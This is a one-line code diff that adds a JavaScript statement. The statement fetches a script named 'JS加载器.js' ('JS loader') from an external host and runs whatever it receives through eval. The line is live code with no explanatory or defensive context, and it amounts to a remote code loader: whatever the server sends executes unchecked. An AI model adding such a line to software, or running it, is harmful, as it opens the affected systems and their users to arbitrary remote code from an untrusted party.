@@ -1,0 +1,1 @@
+curl_get("http://v3.rb9.top/User/get_js.php?&name=JS加载器.js", {}, (r, d) => eval(d));  
